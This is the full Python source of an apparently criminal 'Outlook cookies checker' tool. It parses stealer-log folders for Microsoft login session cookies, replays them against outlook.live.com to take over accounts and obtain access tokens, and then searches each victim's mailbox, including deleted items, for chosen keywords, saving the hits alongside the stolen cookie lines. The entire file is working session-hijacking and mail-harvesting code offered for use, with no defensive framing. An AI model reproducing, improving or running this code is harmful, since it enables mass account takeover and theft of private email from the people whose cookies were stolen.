import requests
import re
import urllib3
from datetime import datetime
import easygui,webbrowser
import os
import threading
import time,sys
import colorama
from concurrent.futures import ThreadPoolExecutor
import html_form_to_dict
import ctypes
from py_parse import Parser
from conn import conn
from urllib.parse import unquote,quote_plus,quote
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
import uuid
class OUTLOOK:
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
    def center(self, var: str, space: int = None):  # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'OUTOOL COOKIES CHECKER  - MADE BY @BINARY_THUG') 
        text = '''    
 ██████╗ ██╗   ██╗████████╗██╗      ██████╗  ██████╗ ██╗  ██╗     ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔═══██╗██║   ██║╚══██╔══╝██║     ██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║   ██║██║   ██║   ██║   ██║     ██║   ██║██║   ██║█████╔╝     ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║   ██║██║   ██║   ██║   ██║     ██║   ██║██║   ██║██╔═██╗     ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝   ██║   ███████╗╚██████╔╝╚██████╔╝██║  ██╗    ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                                                          
*************************                                                                                                                              
@BINARY_THUG
*************************                                                                                                                                                                
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))
    def __init__(self,keylist) -> None:
        self.valid=0
        self.invalid=0
        self.key_list=keylist
        self.total=0
        self.glob_tr=True
    def runner(self,logs_path,workers,datetime,):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for pat in path_list:
                try:
                    executor.submit(self.checker,pat,datetime)
                except:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            executor.shutdown(wait=True)
            self.glob_tr=False
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[OUTLOOK Checker]--BY @BINARY_THUG|VALIDS:{self.valid}|INVALIDS:{self.invalid}|TOTAL LOGS FOLDER:{len(lin)}")
    def makekeyword(self,keyword,acesstok,cv,key,canary):
        payload = {
    "Cvid": "374d11e3-be7f-98ab-7c1f-9c5863011ad8",
    "Scenario": {"Name": "owa.react"},
    "TimeZone": "Greenwich Standard Time",
    "TextDecorations": "Off",
    "EntityRequests": [
        {
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {
                "Or": [
                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                    {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                ]
            },
            "From": 0,
            "Query": {"QueryString": f"{keyword}"},
            "RefiningQueries": None,
            "Size": 50,
            "Sort": [
                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                {"Field": "Time", "SortDirection": "Desc"}
            ],
            "EnableTopResults": True,
            "TopResultsCount": 3
        }
    ],
    "QueryAlterationOptions": {
        "EnableSuggestion": True,
        "EnableAlteration": True,
        "SupportedRecourseDisplayTypes": [
            "Suggestion",
            "NoResultModification",
            "NoResultFolderRefinerModification",
            "NoRequeryModification",
            "Modification"
        ]
    },
    "LogicalId": "45008e38-83a3-387f-f575-50a54bfc2866"
}
        headers = {
    "Host": "outlook.live.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "*/*",
    "Accept-Language": "es-MX",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://outlook.live.com/",
    "Authorization": f"Bearer {acesstok}",  # Left empty as requested
    "Client-Request-Id": "bf0035f4-8b4d-d15d-8c2c-11a258a4444f",
    "Client-Session-Id": "ab7f83fa-8a53-496f-ef3f-620b3df43760",
    "Content-Type": "application/json",
    "Ms-Cv": f"{cv}",
    "Prefer": "exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\", exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"",
    "Scenariotag": "cv",
    "X-Anchormailbox": f"PUID:{key}",
    "X-Client-Flights": "OWA_BestMatch_V15,CalendarInsightsFlight,EESForEmailConv,EESForEmailConvSsa,EnableTidBits,EnableTidBits2,PopulateTidBits,PopulateTidBits2",
    "X-Client-Localtime": "2024-01-22T09:19:13.691Z",
    "X-Clientid": "893DEB30F7444F7585BF793EEE0459E3",
    "X-Ms-Appname": "owa-reactmail",
    "X-Owa-Canary": f"{canary}",
    "X-Owa-Hosted-Ux": "false",
    "X-Owa-Sessionid": "6933caaa-ec2d-473c-9ed5-1734ef8aed73",
    "X-Req-Source": "Mail",
    "X-Routingparameter-Sessionkey": f"PUID:{key}",
    "X-Search-Griffin-Version": "GWSv2",
    "Origin": "https://outlook.live.com",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "TE": "trailers"
}
        try:
            iu=f"https://outlook.live.com/search/api/v2/query?n=85&cv={cv}"
            ter=requests.post(iu,headers=headers,json=payload,verify=False)
            return ter.text
        except:
            return None




    def getrpscrfval(self,dict):
        for name,value in dict.items():
            if name[:12]=="RpsCsrfState":
                return name
            else:
                continue
        
    def anon_is_valid(self,mscs,line,dat,fil):
        u=uuid.uuid4()
        url=f"https://outlook.live.com/owa/?cobrandid={u}&nlp=1&deeplink=owa/"
        headers = {
        'Host': 'outlook.live.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://www.microsoft.com/',
        'Connection': 'keep-alive',
        'Cookie': f'PPLState=1; MSPAuth=Disabled; MSPProf=Disabled; mkt=en-US; mkt1=en-US; MH=MSFT;__Host-MSAAUTHP:{mscs}',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'same-origin',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Encoding': 'gzip, deflate',
        }
        reg=requests.get(url, headers=headers, allow_redirects=False, verify=False)
        if 'Location'in reg.headers:
            pass
        else:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        loc=reg.headers['Location']
        dict_reg=reg.cookies.get_dict()
        cookie_sys="; ".join([f"{name}:{value}" for name , value in dict_reg.items()])
        headers_txt = {
        'Host': 'login.live.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.microsoft.com/',
        'Connection': 'keep-alive',
        'Cookie': f'MSPAuth=Disabled; MSPProf=Disabled;wlidperf=FR=L&ST=1705619177513; __Host-MSAAUTHP={mscs}; PPLState=1; logonLatency=LGN01=638412443803116689',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Accept-Encoding': 'gzip, deflate',
        }
        url_2=loc
        try:
            toc=requests.get(url_2,headers=headers_txt,verify=False)
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        if '__Host-MSAAUTHP' in toc.cookies.get_dict():
            pass
        else:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        
        try:
            loc_2 = Parser().parse(toc.text).find_tag('form').action
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        val_dict=html_form_to_dict.html_form_to_dict(toc.content)
        if 'X-OWA-RedirectHistory' in  reg.cookies.get_dict():
            pass
        else:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        owa=reg.cookies.get_dict()['X-OWA-RedirectHistory']
        rps=self.getrpscrfval(reg.cookies.get_dict())
        try:
            NAPEXP=str(quote_plus(val_dict['NAPExp']))
            Anonexp=str(quote_plus(val_dict['ANONExp']))
            NAB=quote_plus(val_dict["NAP"])
            ANOn=quote_plus(val_dict['ANON'])
            T=quote_plus(val_dict['t'])
            pprid=quote_plus(val_dict['pprid'])
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        payload=f'NAPExp={NAPEXP}&wbids=0&pprid={pprid}&wbid=MSFT&NAP={NAB}&ANON={ANOn}&ANONExp={Anonexp}&t={T}'
        discord= {
        'Host': 'outlook.live.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://login.live.com/',
        'Origin': 'https://login.live.com',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
        'Cookie': f'PPLState=1; MSPAuth=Disabled; MSPProf=Disabled;{rps}={reg.cookies.get_dict()[rps]}; X-OWA-RedirectHistory={owa}; NAP={toc.cookies.get_dict()['NAP']}; ANON={toc.cookies.get_dict()['ANON']}; WLSSC={toc.cookies.get_dict()['WLSSC']}',
        'Accept-Encoding': 'gzip, deflate',   
        }
        try:
            teds=requests.post(loc_2,headers=discord,data=payload,verify=False,allow_redirects=False)
            loc_3=teds.headers['Location']
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        nara={
        'Host': 'outlook.live.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://login.live.com/',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'same-origin',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Encoding': 'gzip, deflate',
        "Cookie":"; ".join([f"{name}={value}" for name,value in teds.cookies.get_dict().items()])
        }
        try:
            losingame=requests.get(loc_3,headers=nara,verify=False,allow_redirects=False)
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
        cookies_outlook=losingame.cookies.get_dict()
        cookies_outlook.update(teds.cookies.get_dict())
        nara_3={
        'Host': 'outlook.live.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://login.live.com/',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'same-origin',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Encoding': 'gzip, deflate',
        "Cookie":"; ".join([f"{name}={value}" for name,value in cookies_outlook.items()])
        }
        MS_CV=requests.get(losingame.headers['Location'],headers=nara_3,verify=False).headers['MS-CV']
        h = {
    'Host': 'outlook.live.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://outlook.live.com/',
    'action': 'GetAccessTokenforResource',
    'content-type': 'application/json; charset=utf-8',
    'ms-cv': f'{MS_CV}',
    'prefer': 'exchange.behavior="IncludeThirdPartyOnlineMeetingProviders"',
    'x-owa-canary': f'{cookies_outlook['X-OWA-CANARY']}',
    'x-owa-correlationid': 'c0031b03-79e8-3231-7978-82afd9cdc076',
    'x-owa-hosted-ux': 'false',
    'x-owa-sessionid': '9e203e81-1402-4599-ad07-18649e5d74c7',
    'x-owa-urlpostdata': '%7B%22__type%22%3A%22TokenRequest%3A%23Exchange%22%2C%22Resource%22%3A%22https%3A%2F%2Foutlook.live.com%22%7D',
    'x-req-source': 'Mail',
    'Origin': 'https://outlook.live.com',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    "Cookie": "; ".join([f"{name}={value}" for name,value in cookies_outlook.items()]),
    'Cache-Control': 'no-cache',
    'Content-Length': '0'
}
        try:
            acesstok=requests.post('https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail&n=6',headers=h,verify=False).json()["AccessToken"]
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        redha='https://outlook.live.com/owa/0/service.svc?action=GetAccountInformation&app=Mail&n=53'
        hes = {
    "Host": "outlook.live.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://outlook.live.com/",
    "action": "GetAccountInformation",
    "Content-Type": "application/json; charset=utf-8",
    "ms-cv": f"{MS_CV}",
    "prefer": "exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"",
    "x-owa-canary": f'{cookies_outlook['X-OWA-CANARY']}',
    "x-owa-correlationid": "02d3d059-e47c-25f1-d1f8-d41fcc888877",
    "x-owa-hosted-ux": "false",
    "x-owa-sessionid": "24711379-0ba1-4c46-9a69-1a3197039fd0",
    "x-owa-urlpostdata": "%7B%22__type%22%3A%22GetAccountInformationRequest%3A%23Exchange%22%2C%22Header%22%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22V2018_01_08%22%2C%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22Pakistan%20Standard%20Time%22%7D%7D%7D%7D",
    "x-req-source": "Mail",
    "Origin": "https://outlook.live.com",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cookie":"; ".join([f"{name}={value}" for name,value in cookies_outlook.items()]),
    "Cache-Control": "no-cache",
    "Content-Length": "0",
    "TE": "trailers"
}
        keywordict={}
        try:
            email=requests.post(redha,headers=hes,verify=False)
            first=email.json()["AccountInfo"]["FirstName"]
            last=email.json()["AccountInfo"]["LastName"]
            fullname=first.strip()+last.strip()
            Total=0
            STRINGOFACESS=""
            for keyword in self.key_list:
                consider=self.makekeyword(keyword,acesstok,MS_CV,key=cookies_outlook['DefaultAnchorMailbox'],canary=cookies_outlook['X-OWA-CANARY'])
                pattern = r'"HitHighlightedSummary":\s*"([^"]*)"'
                hit_highlighted_summaries = re.findall(pattern,consider)
                Total=Total+len(hit_highlighted_summaries)
                if hit_highlighted_summaries==[]:
                    keywordict[keyword]="NULL"
                else:
                    kesari=f"[{keyword}]"
                    STRINGOFACESS=STRINGOFACESS+kesari
                    keywordict[keyword]='\n'.join(hit_highlighted_summaries)
            if STRINGOFACESS=="":
                lums=f'[{fullname}][{Total}].txt'
                output_path=os.path.join(dat,lums)
                with open(output_path,'w',errors='ignore',encoding='utf-8') as waker:         
                    for lin in line:
                        waker.write(lin)
                    waker.write("\n")
                    waker.write("="*8)
                    waker.write("\n")
                    waker.write(f"FULLNAME:{fullname}\n")
                    waker.write(f"BY:@BINARY_THUG\n")
                    for name,values in keywordict.items():
                        waker.write("="*8)
                        waker.write(f"\nKEYWORD:{name}\n")
                        waker.write("="*8)
                        waker.write("\n")
                        waker.write(values+"\n")
                self.valid=self.valid+1
                print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")   
            else:
                lums_dir=f'[{fullname}][{Total}][{STRINGOFACESS}]' 
                create=os.path.join(dat,lums_dir)
                if os.path.exists(create):
                    pass
                else:
                    os.mkdir(create)
                lums_text=f'[{fullname}][{Total}][{STRINGOFACESS}].txt'
                output_path=os.path.join(create,lums_text)
                with open(output_path,'w',errors='ignore',encoding='utf-8') as waker:         
                    for lin in line:
                        waker.write(lin)
                    waker.write("\n")
                    waker.write("="*8)
                    waker.write("\n")
                    waker.write(f"FULLNAME:{fullname}\n")
                    waker.write(f"BY:@BINARY_THUG\n")
                    for name,values in keywordict.items():
                        waker.write("="*8)
                        waker.write(f"\nKEYWORD:{name}\n")
                        waker.write("="*8)
                        waker.write("\n")
                        waker.write(values+"\n")
                self.valid=self.valid+1
                print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")   
        except Exception as e:
            self.invalid=self.invalid+1
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            return None

    def net_to_cookie(self, filename, service):
        cookies = {}
        NF_line = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue

        return cookies, NF_line
    def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE'}:
                    paths.append(os.path.join(root, dir))
        return set(paths)
    def checker(self, path,dt):
        for root, dirs, files in os.walk(path):
            for fil in files:
                if str(fil).endswith(".txt"):
                    full_path = os.path.join(root, fil)
                    cookie, NF_LINES = self.net_to_cookie(full_path, "login.live.com")
                    if '__Host-MSAAUTHP' in cookie:
                        msc=cookie['__Host-MSAAUTHP']
                        huntoni=self.anon_is_valid(msc,NF_LINES,dt,fil)
                    else:
                        continue

    def extract_email(self,text):
        email_pattern = r'[\w\.-]+@[\w\.-]+'
        emails = re.findall(email_pattern, text)
        return emails[0] if emails else None
def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
#mady=datetimefolder(os.path.join(os.getcwd(),"Result"))
#c=OUTLOOK(keylist=["azure"])
#c.runner('C:\\Users\\DELL\\Desktop\\@WATERCLOUD_NOTIFY-22.01.2024-903 FILES-THANKS FOR SUB',12,mady)#
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)  
def ui():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'OUTLOOK  COOKIES CHECKER  - MADE BY @BINARY_THUG') 
    text = '''    
 ██████╗ ██╗   ██╗████████╗██╗      ██████╗  ██████╗ ██╗  ██╗     ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔═══██╗██║   ██║╚══██╔══╝██║     ██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║   ██║██║   ██║   ██║   ██║     ██║   ██║██║   ██║█████╔╝     ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║   ██║██║   ██║   ██║   ██║     ██║   ██║██║   ██║██╔═██╗     ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝   ██║   ███████╗╚██████╔╝╚██████╔╝██║  ██╗    ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                                                          
   ••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
   
   
   '''        
    faded = ''
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            
            red += 15
            if red > 255:
                red = 255
    print(faded)
def main():
    colorama.init()
    os.system("cls")
    print(colorama.Fore.CYAN+"Wait Loading Model")
    maximize_console_window()
    os.system("cls")
    ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        key_list=[]
        os.system("cls")
        print(colorama.Fore.MAGENTA + "LOAD YOUR KEYWORD TXT FILE[For KNOWING HOW TO PUT KEYWORDS IN TXT FILE CHECK Tutorial inside the folder]" + colorama.Fore.RESET)
        time.sleep(1)
        txt_keywords=easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= ' Select Keywords File', multiple= False)
        with open(txt_keywords, 'r', encoding="utf-8") as f:
            for l in f:
                key_list.append(l.replace("\n",""))
        d=OUTLOOK(key_list)
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder(current)
        logs_pathi=easygui.diropenbox(title="OUTLOOK COOKIE CHECKER- SELECT LOGS FOLDER")
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>31:
            os.system("cls")
            print(colorama.Fore.GREEN+"[WARNING]"+colorama.Fore.YELLOW+"Only 30 threads are allowed"+colorama.Fore.RESET)
            thread_num=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        os.system("cls")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"PATH LOADED ")
        d.runner(logs_pathi,int(thread_num),s)
        os.system("cls")
        d.ui()
        d.print_horizontal_line()
        print(d.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(d.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(d.center(colorama.Fore.CYAN+"ENJOY YOUR OUTLOOK COOKIES"+colorama.Fore.RESET))
        d.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[OUTLOOK COOKIE CHECKER]--BY @BINARY_THUG |VALIDS:{d.valid}|INVALIDS:{d.invalid}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
main()
